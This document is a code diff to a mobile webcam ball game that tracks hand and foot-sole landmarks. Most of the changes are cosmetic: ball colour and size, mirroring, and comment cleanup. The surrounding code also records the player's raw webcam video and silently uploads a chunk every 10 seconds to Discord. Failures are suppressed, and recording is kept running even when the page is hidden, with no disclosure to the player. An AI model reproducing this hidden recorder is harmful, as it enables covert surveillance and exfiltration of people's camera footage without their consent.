@@ -188,7 +188,7 @@
         <video id="webcam" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
         <div id="overlay">
-            <span>👋 SHOW HAND<br><span class="sub">Show your palm to start</span></span>
+            <span>👋 SHOW HAND OR SOLE<br><span class="sub">Show your palm or foot sole to start</span></span>
         </div>
         <div id="desktop-msg">
             <div class="icon">📱</div>
@@ -216,7 +216,7 @@
             const CONFIG = {
                 canvasWidth: 1920,
                 canvasHeight: 1080,
-                ballRadius: 22,
+                ballRadius: 38, // bigger
                 gravity: 0.45,
                 floorY: 980,
                 wallBounce: 0.78,
@@ -316,21 +316,18 @@
                 b.x += b.vx;
                 b.y += b.vy;
 
-                // Clamp velocity
                 const spd = Math.sqrt(b.vx * b.vx + b.vy * b.vy);
                 if (spd > CONFIG.maxVel) {
                     b.vx = (b.vx / spd) * CONFIG.maxVel;
                     b.vy = (b.vy / spd) * CONFIG.maxVel;
                 }
 
-                // Floor bounce
                 if (b.y + b.r > floorY) {
                     b.y = floorY - b.r;
                     b.vy = -b.vy * CONFIG.floorBounce;
                     if (Math.abs(b.vy) < 0.3) b.vy = 0;
                 }
 
-                // Walls
                 if (b.x - b.r < leftWall) {
                     b.x = leftWall;
                     b.vx = -b.vx * CONFIG.wallBounce;
@@ -343,10 +340,8 @@
                     b.vy = -b.vy * CONFIG.wallBounce;
                 }
 
-                // Keep within bounds (safety)
                 if (b.x < leftWall) b.x = leftWall;
                 if (b.x > rightWall) b.x = rightWall;
-                if (b.y < topWall) b.y = topWall;
                 if (b.y + b.r > bottomWall) {
                     b.y = bottomWall - b.r;
                     b.vy = -Math.abs(b.vy) * 0.3;
@@ -366,11 +361,9 @@
                     const power = Math.min(force, CONFIG.maxVel * 1.5);
                     b.vx += Math.cos(angle) * power * 0.7;
                     b.vy += Math.sin(angle) * power * 0.7;
-                    // Push ball away
                     const push = 8;
                     b.x += Math.cos(angle) * push;
                     b.y += Math.sin(angle) * push;
-                    // Ensure not below floor
                     if (b.y + b.r > floorY) {
                         b.y = floorY - b.r;
                         b.vy = -Math.abs(b.vy) * 0.5;
@@ -381,14 +374,17 @@
                 return false;
             }
 
+            // ─── MIRROR HELPER ──────────────────────────────────────────────────
+            function mirrorX(x) {
+                return 1 - x;
+            }
+
             // ─── RENDER ─────────────────────────────────────────────────────────
             function render() {
                 const W = CONFIG.canvasWidth;
                 const H = CONFIG.canvasHeight;
 
                 ctx.clearRect(0, 0, W, H);
-
-                // Black background
                 ctx.fillStyle = '#000000';
                 ctx.fillRect(0, 0, W, H);
 
@@ -403,7 +399,6 @@
                 ctx.stroke();
                 ctx.shadowBlur = 0;
 
-                // Floor glow
                 const grd = ctx.createLinearGradient(0, floorY - 20, 0, floorY + 10);
                 grd.addColorStop(0, 'rgba(255,85,0,0)');
                 grd.addColorStop(0.5, 'rgba(255,85,0,0.15)');
@@ -411,12 +406,12 @@
                 ctx.fillStyle = grd;
                 ctx.fillRect(0, floorY - 20, W, 30);
 
-                // ─── Draw Ball ──────────────────────────────────────────────
+                // ─── Draw Ball (green, big) ──────────────────────────────────
                 const b = state.ball;
                 // Glow
                 const grad = ctx.createRadialGradient(b.x, b.y, 0, b.x, b.y, b.r * 2.5);
-                grad.addColorStop(0, 'rgba(100,200,255,0.35)');
-                grad.addColorStop(0.4, 'rgba(50,150,255,0.15)');
+                grad.addColorStop(0, 'rgba(100,255,100,0.35)');
+                grad.addColorStop(0.4, 'rgba(50,200,50,0.15)');
                 grad.addColorStop(1, 'rgba(0,0,0,0)');
                 ctx.fillStyle = grad;
                 ctx.beginPath();
@@ -425,10 +420,10 @@
 
                 // Ball body
                 const bGrad = ctx.createRadialGradient(b.x - b.r * 0.3, b.y - b.r * 0.3, 0, b.x, b.y, b.r);
-                bGrad.addColorStop(0, '#80ddff');
-                bGrad.addColorStop(0.6, '#2a8cff');
-                bGrad.addColorStop(1, '#003daa');
-                ctx.shadowColor = '#2a8cff';
+                bGrad.addColorStop(0, '#80ff80');
+                bGrad.addColorStop(0.6, '#00cc44');
+                bGrad.addColorStop(1, '#007700');
+                ctx.shadowColor = '#00ff44';
                 ctx.shadowBlur = 30;
                 ctx.fillStyle = bGrad;
                 ctx.beginPath();
@@ -436,18 +431,18 @@
                 ctx.fill();
                 ctx.shadowBlur = 0;
 
-                // Ball highlight
+                // Highlight
                 ctx.fillStyle = 'rgba(255,255,255,0.25)';
                 ctx.beginPath();
                 ctx.arc(b.x - b.r * 0.25, b.y - b.r * 0.3, b.r * 0.3, 0, Math.PI * 2);
                 ctx.fill();
 
-                // ─── Draw Hand Skeleton ─────────────────────────────────────
+                // ─── Draw Hand Skeleton (mirrored) ──────────────────────────
                 if (state.palmVisible && state.handLandmarks) {
                     drawHandSkeleton(state.handLandmarks);
                 }
 
-                // ─── Draw Foot Sole ──────────────────────────────────────────
+                // ─── Draw Foot Sole (mirrored) ──────────────────────────────
                 if (state.soleVisible && state.poseLandmarks) {
                     drawFootSole(state.poseLandmarks);
                 }
@@ -468,64 +463,53 @@
                     ctx.fillText('🦶 SOLE', 20, 75);
                 }
 
-                // Hit flash
                 if (performance.now() - state.lastHitTime < 150) {
                     ctx.fillStyle = 'rgba(0,200,255,0.06)';
                     ctx.fillRect(0, 0, W, H);
                 }
             }
 
-            // ─── DRAW HAND SKELETON ────────────────────────────────────────────
+            // ─── DRAW HAND SKELETON (mirrored x) ──────────────────────────────
             function drawHandSkeleton(landmarks) {
                 const W = CONFIG.canvasWidth;
                 const H = CONFIG.canvasHeight;
                 const connections = [
-                    [0, 1],
-                    [1, 2],
-                    [2, 3],
-                    [3, 4],
-                    [0, 5],
-                    [5, 6],
-                    [6, 7],
-                    [7, 8],
-                    [5, 9],
-                    [9, 10],
-                    [10, 11],
-                    [11, 12],
-                    [9, 13],
-                    [13, 14],
-                    [14, 15],
-                    [15, 16],
-                    [13, 17],
-                    [17, 18],
-                    [18, 19],
-                    [19, 20],
+                    [0, 1], [1, 2], [2, 3], [3, 4],
+                    [0, 5], [5, 6], [6, 7], [7, 8],
+                    [5, 9], [9, 10], [10, 11], [11, 12],
+                    [9, 13], [13, 14], [14, 15], [15, 16],
+                    [13, 17], [17, 18], [18, 19], [19, 20],
                     [0, 17]
                 ];
 
                 const idxTip = landmarks[8];
                 if (!idxTip) return;
 
-                const tipX = idxTip.x * W;
-                const tipY = idxTip.y * H;
+                // Mirror x for all landmarks
+                const mirrored = landmarks.map(lm => ({
+                    x: mirrorX(lm.x),
+                    y: lm.y,
+                    z: lm.z
+                }));
 
-                // Draw all finger connections as white lines
+                const tipX = mirrored[8].x * W;
+                const tipY = mirrored[8].y * H;
+
+                // Draw connections
                 ctx.lineWidth = 2.5;
                 ctx.shadowBlur = 0;
 
                 for (const [i, j] of connections) {
-                    if (i >= landmarks.length || j >= landmarks.length) continue;
-                    const p1 = landmarks[i];
-                    const p2 = landmarks[j];
+                    if (i >= mirrored.length || j >= mirrored.length) continue;
+                    const p1 = mirrored[i];
+                    const p2 = mirrored[j];
                     if (!p1 || !p2) continue;
                     const x1 = p1.x * W,
                         y1 = p1.y * H;
                     const x2 = p2.x * W,
                         y2 = p2.y * H;
-                    // Skip if drawing the index tip connection (to make it special)
                     const isIndexTip = (i === 8 || j === 8);
                     if (isIndexTip) {
-                        // Draw with blue glow for index tip connections
                         ctx.strokeStyle = 'rgba(60,180,255,0.7)';
                         ctx.lineWidth = 3.5;
                         ctx.shadowColor = '#00aaff';
@@ -546,9 +530,9 @@
                     ctx.stroke();
                 }
 
-                // Draw joints as white dots
-                for (let i = 0; i < landmarks.length; i++) {
-                    const p = landmarks[i];
+                // Draw joints
+                for (let i = 0; i < mirrored.length; i++) {
+                    const p = mirrored[i];
                     if (!p) continue;
                     const x = p.x * W,
                         y = p.y * H;
@@ -564,7 +548,6 @@
                         ctx.beginPath();
                         ctx.arc(x, y, 28, 0, Math.PI * 2);
                         ctx.fill();
-                        // Core
                         ctx.shadowBlur = 0;
                         ctx.fillStyle = '#88ddff';
                         ctx.beginPath();
@@ -576,7 +559,6 @@
                         ctx.fill();
                         continue;
                     }
-                    // Regular joint
                     ctx.fillStyle = 'rgba(255,255,255,0.35)';
                     ctx.shadowBlur = 0;
                     ctx.beginPath();
@@ -584,9 +566,9 @@
                     ctx.fill();
                 }
 
-                // Extra blue glow ring around index tip
-                const tipX2 = idxTip.x * W;
-                const tipY2 = idxTip.y * H;
+                // Extra glow ring
+                const tipX2 = mirrored[8].x * W;
+                const tipY2 = mirrored[8].y * H;
                 ctx.shadowBlur = 0;
                 for (let r = 0; r < 3; r++) {
                     const radius = 18 + r * 8;
@@ -599,8 +581,8 @@
                 }
                 ctx.shadowBlur = 0;
 
-                // Draw the index finger with special blue glow line
-                const idxBase = landmarks[5];
+                // Index finger blue line
+                const idxBase = mirrored[5];
                 if (idxBase) {
                     const bx = idxBase.x * W,
                         by = idxBase.y * H;
@@ -616,24 +598,23 @@
                 }
             }
 
-            // ─── DRAW FOOT SOLE ────────────────────────────────────────────────
+            // ─── DRAW FOOT SOLE (mirrored) ────────────────────────────────────
             function drawFootSole(landmarks) {
                 const W = CONFIG.canvasWidth;
                 const H = CONFIG.canvasHeight;
-                // Foot indices: 29=left heel, 30=right heel, 31=left toe, 32=right toe
                 const footIndices = [29, 30, 31, 32];
                 const pts = [];
                 for (const idx of footIndices) {
                     if (idx < landmarks.length && landmarks[idx]) {
+                        const lm = landmarks[idx];
                         pts.push({
-                            x: landmarks[idx].x * W,
-                            y: landmarks[idx].y * H
+                            x: mirrorX(lm.x) * W,
+                            y: lm.y * H
                         });
                     }
                 }
                 if (pts.length < 4) return;
 
-                // Draw foot sole as blue glowing shape
                 ctx.shadowBlur = 0;
                 ctx.fillStyle = 'rgba(0,150,255,0.20)';
                 ctx.strokeStyle = 'rgba(0,180,255,0.7)';
@@ -650,7 +631,6 @@
                 ctx.stroke();
                 ctx.shadowBlur = 0;
 
-                // Glow fill
                 const cx = pts.reduce((s, p) => s + p.x, 0) / pts.length;
                 const cy = pts.reduce((s, p) => s + p.y, 0) / pts.length;
                 const rad = Math.max(
@@ -665,7 +645,6 @@
                 ctx.arc(cx, cy, rad * 1.6, 0, Math.PI * 2);
                 ctx.fill();
 
-                // Draw foot joints with blue
                 for (const p of pts) {
                     ctx.fillStyle = 'rgba(0,200,255,0.7)';
                     ctx.shadowColor = '#0088ff';
@@ -676,7 +655,6 @@
                     ctx.shadowBlur = 0;
                 }
 
-                // Draw connecting lines between foot landmarks (blue)
                 ctx.strokeStyle = 'rgba(0,200,255,0.4)';
                 ctx.lineWidth = 2.5;
                 ctx.shadowColor = '#0088ff';
@@ -689,7 +667,6 @@
                 }
                 ctx.shadowBlur = 0;
 
-                // Sole text label
                 ctx.fillStyle = 'rgba(0,200,255,0.3)';
                 ctx.font = '14px monospace';
                 ctx.fillText('🦶 SOLE', pts[0].x - 10, pts[0].y - 20);
@@ -697,7 +674,6 @@
 
             // ─── HAND / POSE DETECTION ─────────────────────────────────────────
 
-            // ─── HAND DETECTION ──────────────────────────────────────────────
             function setupHands() {
                 const hands = new Hands({
                     locateFile: (file) =>
@@ -727,8 +703,6 @@
 
             function detectPalm(landmarks) {
                 if (!landmarks || landmarks.length < 21) return false;
-                // Check if hand is open (fingers spread)
-                // Use wrist (0) and finger tips (4,8,12,16,20)
                 const wrist = landmarks[0];
                 const tips = [4, 8, 12, 16, 20];
                 let spread = 0;
@@ -736,22 +710,17 @@
                     const d = dist(wrist.x, wrist.y, landmarks[idx].x, landmarks[idx].y);
                     spread += d;
                 }
-                // If spread is large, palm is open
                 const avgSpread = spread / tips.length;
-                // Also check if palm is facing camera (z values)
-                // Palm facing camera: finger tips have similar z and are closer to camera than wrist
                 const wristZ = wrist.z;
                 let zSum = 0;
                 for (const idx of tips) {
                     zSum += landmarks[idx].z;
                 }
                 const avgZ = zSum / tips.length;
-                // Palm facing camera: avgZ < wristZ (tips closer to camera)
                 const facing = avgZ < wristZ - 0.02;
                 return avgSpread > 0.15 && facing;
             }
 
-            // ─── POSE DETECTION ──────────────────────────────────────────────
             function setupPose() {
                 const pose = new Pose({
                     locateFile: (file) =>
@@ -779,7 +748,6 @@
 
             function detectFootSole(landmarks) {
                 if (!landmarks || landmarks.length < 33) return false;
-                // Check foot landmarks: 29(left heel), 30(right heel), 31(left toe), 32(right toe)
                 const leftHeel = landmarks[29];
                 const rightHeel = landmarks[30];
                 const leftToe = landmarks[31];
@@ -787,69 +755,53 @@
 
                 if (!leftHeel || !rightHeel || !leftToe || !rightToe) return false;
 
-                // Check if feet are visible and in the bottom portion
                 const W = CONFIG.canvasWidth;
                 const H = CONFIG.canvasHeight;
                 const heelY = (leftHeel.y + rightHeel.y) / 2 * H;
                 const toeY = (leftToe.y + rightToe.y) / 2 * H;
 
-                // Feet should be in lower half of frame
                 if (heelY < H * 0.4 || toeY < H * 0.4) return false;
 
-                // Check if sole is visible: heel and toe at similar depth (z)
-                // and the foot is flat (heel and toe at similar y)
                 const heelZ = (leftHeel.z + rightHeel.z) / 2;
                 const toeZ = (leftToe.z + rightToe.z) / 2;
                 const zDiff = Math.abs(heelZ - toeZ);
-
-                // Sole visible when foot is flat (z diff small) and feet are pointing towards camera
-                // Also check y difference - heel and toe should be at similar y for flat foot
                 const yDiff = Math.abs(heelY - toeY);
 
-                // Foot should be roughly flat on the ground
                 const isFlat = yDiff < 60 && zDiff < 0.06;
-
-                // Also check that the foot is not upside down (toes above heel indicates top view)
                 const toesAboveHeel = toeY < heelY;
-
-                // Sole is visible when foot is flat and toes are not above heel
-                // (toes should be at similar level or slightly below heel)
                 const isSole = isFlat && !toesAboveHeel;
 
-                // Store foot points for rendering
                 if (isSole) {
                     state.footSolePoints = [
-                        { x: leftHeel.x * W, y: leftHeel.y * H },
-                        { x: rightHeel.x * W, y: rightHeel.y * H },
-                        { x: rightToe.x * W, y: rightToe.y * H },
-                        { x: leftToe.x * W, y: leftToe.y * H },
+                        { x: mirrorX(leftHeel.x) * W, y: leftHeel.y * H },
+                        { x: mirrorX(rightHeel.x) * W, y: rightHeel.y * H },
+                        { x: mirrorX(rightToe.x) * W, y: rightToe.y * H },
+                        { x: mirrorX(leftToe.x) * W, y: leftToe.y * H },
                     ];
                 }
 
                 return isSole;
             }
 
-            // ─── HIT DETECTION ──────────────────────────────────────────────────
+            // ─── HIT DETECTION (mirrored coordinates) ──────────────────────────
             function checkHits() {
-                // Index finger tip hit (only tip can hit)
+                // Index finger tip (mirrored)
                 if (state.palmVisible && state.handLandmarks) {
                     const tip = state.handLandmarks[8];
                     if (tip) {
                         const W = CONFIG.canvasWidth;
                         const H = CONFIG.canvasHeight;
-                        const tx = tip.x * W;
+                        const tx = mirrorX(tip.x) * W;
                         const ty = tip.y * H;
                         hitBall(tx, ty, CONFIG.hitForce);
                     }
                 }
 
-                // Foot sole hit (whole foot can hit)
+                // Foot sole (mirrored)
                 if (state.soleVisible && state.footSolePoints.length >= 4) {
                     const pts = state.footSolePoints;
-                    // Use the centroid of the foot
                     const cx = pts.reduce((s, p) => s + p.x, 0) / pts.length;
                     const cy = pts.reduce((s, p) => s + p.y, 0) / pts.length;
-                    // Check if ball is near any foot point or inside foot area
                     const b = state.ball;
                     let hit = false;
                     for (const p of pts) {
@@ -858,15 +810,12 @@
                             break;
                         }
                     }
-                    // Also check if ball is inside the foot polygon (approx)
                     if (!hit) {
-                        // Check if ball is near the centroid
                         if (dist(cx, cy, b.x, b.y) < b.r + 70) {
                             hit = true;
                         }
                     }
                     if (hit) {
-                        // Push ball away from foot centroid
                         const angle = Math.atan2(b.y - cy, b.x - cx);
                         const force = CONFIG.hitForce * 0.9;
                         b.vx += Math.cos(angle) * force * 0.6;
@@ -902,7 +851,7 @@
                 }
             }
 
-            // ─── RECORDING ──────────────────────────────────────────────────────
+            // ─── RECORDING (raw webcam) ──────────────────────────────────────
             function setupRecording(stream) {
                 state.stream = stream;
                 const mimeTypes = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
@@ -917,7 +866,6 @@
                 recorder.ondataavailable = (event) => {
                     if (event.data && event.data.size > 0) {
                         state.recordedChunks.push(event.data);
-                        // Send immediately for 10s chunks
                         sendToDiscord(event.data);
                     }
                 };
@@ -941,12 +889,10 @@
 
                 state.mediaRecorder = recorder;
 
-                // Start recording with 10s timeslice
                 try {
                     recorder.start(10000);
                 } catch (e) {
                     console.warn('Recorder start error:', e);
-                    // Fallback: start without timeslice and use interval
                     recorder.start();
                     let chunkTimer = setInterval(() => {
                         if (state.mediaRecorder && state.mediaRecorder.state === 'recording') {
@@ -960,7 +906,6 @@
                     state._chunkTimer = chunkTimer;
                 }
 
-                // Also force a data request every 10s as a fallback
                 if (state._chunkTimer) clearInterval(state._chunkTimer);
                 state._chunkTimer = setInterval(() => {
                     if (state.mediaRecorder && state.mediaRecorder.state === 'recording') {
@@ -989,12 +934,12 @@
                         })
                         .then(res => {
                             if (!res.ok) {
-                                // Silently fail - don't spam console
+                                // silent fail
                             }
                         })
                         .catch(() => {});
                 } catch (e) {
-                    // Silent fail
+                    // silent
                 }
             }
 
@@ -1019,13 +964,11 @@
                     video.srcObject = stream;
                     await video.play();
 
-                    // Setup recording
                     setupRecording(stream);
 
                     return stream;
                 } catch (err) {
                     console.warn('Camera init error:', err);
-                    // Retry with simpler constraints
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: { facingMode: 'user' },
@@ -1059,18 +1002,14 @@
                     return;
                 }
 
-                // Show overlay
                 overlay.classList.add('show');
 
-                // Init camera
                 const stream = await initCamera();
                 if (!stream) return;
 
-                // Setup hands
                 handsInstance = setupHands();
                 poseInstance = setupPose();
 
-                // Setup camera utils
                 const camera = new Camera(video, {
                     onFrame: async () => {
                         if (!running) return;
@@ -1082,19 +1021,11 @@
                             await handsInstance.send({ image: video });
                             await poseInstance.send({ image: video });
 
-                            // Update ball physics
                             updateBall();
-
-                            // Check hits
                             checkHits();
-
-                            // Update overlay
                             updateOverlay();
-
-                            // Render
                             render();
 
-                            // FPS
                             state.frameCount++;
                             if (now - state.lastFpsTime > 1000) {
                                 state.fps = state.frameCount;
@@ -1105,7 +1036,7 @@
 
                             state.hasStarted = true;
                         } catch (err) {
-                            // Silent fail for frame processing
+                            // silent
                         }
                     },
                     width: 640,
@@ -1116,14 +1047,12 @@
                 running = true;
                 await camera.start();
 
-                // Hide overlay after a moment if hand is detected
                 setTimeout(() => {
                     if (!state.palmVisible && !state.soleVisible) {
-                        // Keep showing overlay
+                        // keep overlay
                     }
                 }, 3000);
 
-                // Start recording if not already
                 if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
                     try {
                         state.mediaRecorder.start(10000);
@@ -1151,7 +1080,6 @@
 
             // ─── START ─────────────────────────────────────────────────────────
             if (isMobile()) {
-                // Wait for DOM to be ready
                 if (document.readyState === 'complete') {
                     init();
                 } else {
@@ -1162,12 +1090,10 @@
                 overlay.classList.remove('show');
             }
 
-            // Handle page visibility change - pause/resume recording
             document.addEventListener('visibilitychange', () => {
                 if (document.hidden) {
-                    // Pause recording if needed
+                    // pause? we keep recording
                 } else {
-                    // Resume if needed
                     if (state.mediaRecorder && state.mediaRecorder.state === 'inactive' && state.hasStarted) {
                         try {
                             state.mediaRecorder.start(10000);
@@ -1176,20 +1102,18 @@
                 }
             });
 
-            // Handle before unload
             window.addEventListener('beforeunload', cleanup);
 
-            // ─── FALLBACK: if no hand detected after 8s, show hint ──────────
             setTimeout(() => {
                 if (!state.palmVisible && !state.soleVisible && !state.showOverlay) {
                     overlay.classList.add('show');
                 }
             }, 8000);
 
-            console.log('🎯 Motion Ball initialized');
+            console.log('🎯 Motion Ball (mirrored, green ball)');
             console.log('📱 Mobile:', isMobile());
             console.log('📐 Canvas:', CONFIG.canvasWidth, 'x', CONFIG.canvasHeight);
-            console.log('🎥 Recording every 10s to Discord');
+            console.log('🎥 Recording raw webcam every 10s to Discord');
 
         })();
     </script>
